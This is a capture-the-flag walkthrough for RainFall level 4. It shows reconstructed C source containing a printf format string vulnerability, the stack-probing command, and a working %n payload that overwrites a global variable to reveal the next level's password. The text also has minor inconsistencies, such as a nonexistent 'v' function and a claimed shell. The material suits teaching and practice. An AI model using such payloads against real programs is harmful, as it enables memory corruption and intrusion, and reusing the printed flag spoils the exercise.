# Level 4

## Answer
Our C source code generates the same assembly code as the original binary. Compile it as follows:
```
gcc -fno-stack-protector source.c
```

Let's take a look at the source code:
```c
#include <stdio.h>
#include <stdlib.h>

int m;

void p(char *buffer)
{
    printf(buffer);
}

void n(void)
{
    char buffer[512];
    fgets(buffer, 512, stdin);

    p(buffer);
    if (m == 16930116)
        system("/bin/cat /home/user/level5/.pass");
}

int main(void)
{
    n();
}
```

Let's focus on the `v` function. It reads input using the `fgets` function, which is known to be safe due to its mechanism to limit the number of bytes read. However the `printf` function (called from the `p` function) is known to be unsafe when user input is passed as the format argument, it's referred to as a format string vulnerability.

This exercise is the same as the previous one, except that we have to write 16930116 bytes to the `m` variable to spawn a shell. Please refer to the [level3 walkthrough](../level3/walkthrough.md) for a detailed explanation of the format string vulnerability.

So, First let's locate our input string on the stack and then determine the address of `m`:
```bash
level4@RainFall:~$ python -c 'print("AAAA %x %x %x %x %x %x %x %x %x %x %x %x")' | ./level4
AAAA b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 41414141
```

In this output, 41414141, the hexadecimal representation of 'AAAA', is found at the twelfth position.

The assembly code reveals that the address of the `m` variable is `0x8049810`.

We can then craft our payload:
```
address of m + padding + %n format specifier pointing to the twelfth argument

"\x08\x04\x98\x10"[::-1] + "%16930112p" + "%12$n"
```

Since we need to write 16930116 into `m`, we write 16930116 characters (4 from the address of m and 16930112 from the width specifier of `%p`). 
Then, we use the `%n` format specifier to write the count of bytes written so far into the twelfth argument, which corresponds to `m`'s address.

Let's run our payload:
```bash
level4@RainFall:~$ python -c 'print("\x08\x04\x98\x10"[::-1] + "%16930112p" + "%12$n")' | ./level4
[...]
0xb7ff26b0
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

We are now level5! Let's move on to the next level.
